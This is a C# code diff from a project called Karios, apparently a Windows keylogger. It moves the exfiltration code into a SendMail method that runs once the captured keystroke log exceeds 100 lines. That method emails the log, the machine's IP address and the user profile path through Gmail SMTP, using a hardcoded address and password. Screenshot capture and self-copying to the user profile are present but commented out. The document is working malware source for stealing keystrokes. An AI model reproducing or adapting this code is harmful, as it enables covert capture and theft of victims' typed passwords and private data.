@@ -17,6 +17,8 @@ using System.Drawing;
 using System.Runtime.Remoting.Messaging;
 using System.Net.Mime;
 using System.Net.NetworkInformation;
+using System.Timers;
+using Timer = System.Windows.Forms.Timer;
 
 namespace Karios
 {
@@ -261,9 +263,15 @@ namespace Karios
                 Console.WriteLine("Something went wrong, im dieing");
             }  
             Console.WriteLine("Trying to send emailsss");
+
             if (File.ReadAllLines(pathToLog).Length <= 100) return CallNextHookEx(_hookId, nCode, wParam, lParam);
+            {
+                SendMail();
+            }
+            /*
             try
             {
+                //if()
                 Console.WriteLine("Testing emails");
                 MessageBox.Show("Sending Email....");
                 var mail = new MailMessage();
@@ -285,7 +293,7 @@ namespace Karios
                     Name = "screen"
                 };
                 mail.Attachments.Add(new Attachment(memStream, contentType));
-                */
+                
 
                 // Set ports and stuff
                 smtpServer.Port = 587;
@@ -299,7 +307,7 @@ namespace Karios
             {
                 // ignored
             }
-
+            */
             //System.IO.File.Copy(path, Application.StartupPath + @"\log.txt", true);
             // ReSharper disable once UnusedVariable
             var alldrives = DriveInfo.GetDrives();
@@ -345,6 +353,47 @@ namespace Karios
                                 , Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" + AppDomain.CurrentDomain.FriendlyName, true);
             }
             */
+        }
+
+        public static void SendMail()
+        {
+            try
+            {
+                Console.WriteLine("Testing emails");
+                MessageBox.Show("Sending Email....");
+                var mail = new MailMessage();
+                var smtpServer = new SmtpClient("smtp.gmail.com");
+                mail.From = new MailAddress("GINGIRULES@gmail.com");
+                mail.To.Add(_emailEndpoint);
+                mail.Subject = "log from keylogger on" + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+                mail.Body = "New log file from Computer (" + GetIpAddress(Dns.GetHostName()) + " , finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
+                var attachment = new Attachment(pathToLog);
+                mail.Attachments.Add(attachment);
+                /*
+                CaptureDesktop();
+                // Convert it!
+                var memStream = new MemoryStream(); //new one
+                memoryImage.Save(memStream, ImageFormat.Jpeg);
+                var contentType = new ContentType
+                {
+                    MediaType = MediaTypeNames.Image.Jpeg,
+                    Name = "screen"
+                };
+                mail.Attachments.Add(new Attachment(memStream, contentType));
+                */
+
+                // Set ports and stuff
+                smtpServer.Port = 587;
+                smtpServer.Credentials = new NetworkCredential("GINGIRULES@gmail.com", "G1ng1RuleS");
+                smtpServer.EnableSsl = true;
+                smtpServer.Send(mail);
+                //clear mail attachment
+                attachment.Dispose();
+            }
+            catch
+            {
+                // ignored
+            }
         }
 
         public static IPAddress GetIpAddress(string hostName)
